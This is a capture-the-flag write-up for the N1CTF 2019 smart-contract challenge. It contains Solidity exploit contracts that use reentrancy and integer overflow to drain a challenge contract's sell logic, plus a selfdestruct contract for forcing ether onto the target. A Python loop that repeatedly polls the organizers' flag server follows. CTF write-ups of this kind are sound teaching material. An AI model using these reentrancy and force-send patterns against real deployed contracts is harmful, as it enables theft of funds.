## challenges
[https://github.com/beafb1b1/challenges/tree/master/n1ctf/2019_h4ck_Smart_Contract](https://github.com/beafb1b1/challenges/tree/master/n1ctf/2019_h4ck_Smart_Contract)

- collectmoney: collect tokens and transfer to contract reentrancy 100 times
- reentrancy: buy and reentracy to int overflow the sellTimes

## exploit
```solidity
contract collectmoney{
    address addr=0xE2d6d8808087D2e30EAdF0ACb67708148dbee0C0;
    address public reentry;
    
    function () payable {
    }
    
    function set_reentry(address target)
    {
        reentry=target;
    }
    
    function exploit(uint times)
    {
        for (uint i=0;i<times;i++)
        {
            challenge(addr).buy.value(1)();
            challenge(addr).transfer(reentry,1);
        }
    }
    
}

contract reentrancy{
    address addr=0xE2d6d8808087D2e30EAdF0ACb67708148dbee0C0;
    uint have_withdraw;
    
    function attack_buy(){
        challenge(addr).buy.value(1)();
    }
    
    function attack(){
        challenge(addr).sell(100);
    }
    
    function () payable {
        if (have_withdraw==0 && msg.sender==addr){
            have_withdraw=1;
            challenge(addr).sell(100);
        }
    }
    
    function getflag() public{
        challenge(addr).winnerSubmit();
    }
}

contract transfer_force{
    
    address owner;
    
    function () payable {
    }
    
    constructor()public{
        owner = msg.sender;
    }
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    function kill(address to) public onlyOwner {
        selfdestruct(to);
    }
}
```

## sth to say

This challenge is not use the email solution to send the flag. Instead of that, it use a web interface which have a lot of problems. At the beginning of the game, flag can be obtained by getting someone else's winner's address and submitting it. Later, the organizers limited each winner address to only get flag once. But somebody made trouble by submitting other winner addresss indefinitely. So I had to use the following script to get the final flag.
```python
import requests

url="http://47.244.41.61/challenge?address=0xfe03e84d6069fd0ca2679638eb80c4483885efd8"

while True:
    print requests.get(url).content.split("alert")[1].split("script")[0]
```
Maybe an [email BOT](blockchain/realworldctf_2019_bank/email_bot/) is a better choice.
